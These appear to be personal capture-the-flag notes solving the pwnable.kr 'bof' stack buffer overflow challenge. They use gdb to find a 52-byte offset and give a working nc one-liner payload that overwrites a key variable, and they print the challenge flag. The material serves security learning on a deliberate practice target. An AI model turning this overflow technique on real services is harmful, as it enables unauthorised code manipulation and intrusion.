(WITH HELP)
view source file, input buffer is before key in function "func", can buffer overflow buffer to change key
view addresses of key and buffer start to see what size buffer should be
gdb bof, break gets (after getting the buffer, before comparing so it will work), run, next (to get after executing gets)
key: key gets into function as local parameter in stack (after ebp+esp,8 bytes: key is in ebp+8), x $ebp+8 to see content
0xffffcf80:     0xdeadbeef
buffer start: in disassembly of func(disas func in gdb), before gets esp holds the value of eax which holds the value (address) of ebp-0x2c
x/1s $ebp-0x2c to see value:
0xffffcf4c:     ""
subtract both to get needed size of buffer = 52 bytes
use nc to send a buffer long enough with the wanted key after 52 bytes:
command: (python -c 'print("\x66"*52+"\xbe\xba\xfe\xca")';cat) | nc pwnable.kr 9000, cat flag
flag: "daddy, I just pwned a buFFer :)"
